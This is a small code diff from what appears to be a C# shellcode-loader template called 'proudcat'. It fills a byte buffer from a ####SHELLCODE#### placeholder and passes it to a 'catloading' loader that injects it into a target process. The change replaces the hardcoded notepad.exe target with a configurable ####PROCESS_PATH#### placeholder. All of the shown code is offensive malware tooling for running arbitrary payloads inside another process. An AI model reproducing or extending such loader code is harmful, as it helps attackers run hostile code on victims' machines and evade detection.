@@ -363,11 +363,8 @@ namespace proudcat
             byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
             
             //####CALL####
-
-            if (is64bit)
-                strTargetProcess = "C:\\Windows\\System32\\notepad.exe";
-            else
-                strTargetProcess = "C:\\Windows\\SysWOW64\\notepad.exe";
+            
+            strTargetProcess = "####PROCESS_PATH####";
 
             catloading ldr = new catloading();
             ldr.Load(strTargetProcess, buf);
